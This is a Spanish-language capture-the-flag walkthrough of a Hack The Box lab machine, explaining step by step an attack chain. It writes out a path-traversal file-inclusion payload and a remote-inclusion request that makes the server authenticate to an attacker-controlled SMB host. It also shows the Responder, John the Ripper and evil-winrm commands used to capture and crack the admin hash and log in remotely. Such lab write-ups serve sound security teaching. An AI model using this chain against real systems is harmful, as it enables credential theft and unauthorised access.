Esta máquina de **Hack The Box** enseña principalmente:

- **LFI / RFI**
    
- **captura de hashes NTLM**
    
- **NetNTLMv2**
    
- **cracking de hash**
    
- **acceso remoto con WinRM**
    

---

# 1 Reconocimiento inicial (Web)

Entramos a:

```
http://10.129.x.x
```

La página **nos redirige a:**

```
unika.htb
```

Por eso la respuesta fue:

```
unika.htb
```

### ¿Qué significa esto?

El servidor usa **virtual hosts**.

Por eso añadimos en `/etc/hosts`:

```
10.129.x.x unika.htb
```

Así nuestro navegador sabe resolver ese dominio.

---

# 2️ Identificar la tecnología

Cuando vemos páginas como:

```
index.php
```

sabemos que el backend usa:

**PHP**

PHP ejecuta código en el servidor y puede incluir archivos.

Esto es importante porque **PHP usa mucho `include()`**, lo que a menudo genera **LFI**.

**LFI** significa **Local File Inclusion**.

 **Definición corta:**  
Es una vulnerabilidad web donde un atacante puede hacer que el servidor **cargue o lea archivos locales del sistema** manipulando un parámetro de la URL.

 Ejemplo:

http://site.com/index.php?page=home.html

Si es vulnerable, el atacante puede cambiarlo a:

?page=../../../../windows/system32/drivers/etc/hosts

Así el servidor **muestra archivos internos del sistema**.

---

# 3️ Encontrar el parámetro vulnerable

En la URL aparecía algo así:

```
http://unika.htb/index.php?page=french.html
```

Aquí vemos el parámetro:

```
page
```

Esto sugiere que el backend hace algo como:

```php
include($_GET['page']);
```

Esto es **muy peligroso**.

---

# 4️ Descubrir LFI (Local File Inclusion)

Si podemos controlar `page`, podemos intentar leer archivos del sistema.

Probamos:

```
?page=../../../../windows/system32/drivers/etc/hosts
```

Esto funciona porque usamos:

### Path Traversal

```
../../../../
```

que significa **subir directorios**.

El archivo que leímos fue:

```
windows/system32/drivers/etc/hosts
```

Esto confirmó que existe una vulnerabilidad:

### LFI

**Local File Inclusion**

---

# 5️ Pensamiento del atacante

Ahora pensamos:

> Si el servidor puede incluir archivos locales...  
> ¿podrá incluir archivos remotos?

Eso sería:

### RFI

**Remote File Inclusion**

---

# 6️ Intentamos cargar un archivo remoto

Probamos:

```
?page=//10.10.14.x/somefile
```

Eso hace que el servidor intente abrir:

```
\\10.10.14.x\somefile
```

Esto usa el protocolo:

### SMB

Cuando Windows intenta acceder a un recurso SMB remoto, automáticamente intenta **autenticarse**.

Y aquí aparece el concepto clave:

### NTLM

**NTLM**

Significa:

```
New Technology LAN Manager
```

---

# 7️ Qué ocurre realmente (muy importante)

Cuando el servidor intenta acceder a:

```
\\10.10.14.x\somefile
```

Windows hace esto:

```
Servidor -> pide autenticación
Servidor Windows -> envía hash NTLM
```

Pero nosotros controlamos ese servidor falso.

Entonces capturamos el hash.

Para eso usamos:

### Responder

---

# 8️ Qué hace Responder

Responder:

- crea un **servidor SMB falso**
    
- responde a peticiones de autenticación
    
- captura **NetNTLMv2 hashes**
    

Lo ejecutamos así:

```
sudo responder -I tun0
```

La bandera:

```
-I
```

significa:

```
interface
```

---

# 9️ El hash capturado

Responder mostró algo como:

```
Administrator::RESPONDER:...
```

Eso es un:

### NetNTLMv2 hash

**NetNTLMv2**

No es la contraseña.

Es un **challenge-response hash**.

---

# 10 Romper el hash

Ahora usamos:

### John the Ripper

para probar contraseñas:

```
john hash.txt --wordlist=rockyou.txt
```

El diccionario:

```
rockyou.txt
```

contiene millones de passwords comunes.

El resultado fue:

```
Administrator:badminton
```

Contraseña:

```
badminton
```

---

# 11 Acceso remoto al servidor

Ahora tenemos:

```
usuario: Administrator
password: badminton
```

Buscamos servicios abiertos.

Uno es:

```
5985
```

Ese puerto es:

### Windows Remote Management

o **WinRM**.

---

# 12 Conectarnos con WinRM

Usamos:

### Evil-WinRM

```
evil-winrm -i 10.129.x.x -u Administrator -p badminton
```

Esto nos dio una **shell remota en Windows**.

---

# 13 Buscar la flag

Como en casi todas las máquinas de **Hack The Box**, las flags están en:

```
C:\Users\<user>\Desktop
```

Entonces buscamos allí.

---

#  El razonamiento del pentester

El flujo mental fue:

```
web
 ↓
parámetro sospechoso
 ↓
LFI
 ↓
¿puedo forzar autenticación SMB?
 ↓
RFI
 ↓
capturar NetNTLM
 ↓
crackear password
 ↓
acceso remoto
```

---

#  Lo más importante que enseña esta máquina

Aprender esta cadena de ataque:

```
LFI
  ↓
SMB authentication
  ↓
Responder
  ↓
NetNTLMv2
  ↓
password cracking
  ↓
WinRM access
```

---

#  Algo muy importante que debes recordar

Este ataque es **MUY realista**.

Muchísimos pentests reales funcionan así:

```
LFI → NTLM capture → crack → acceso
```

---
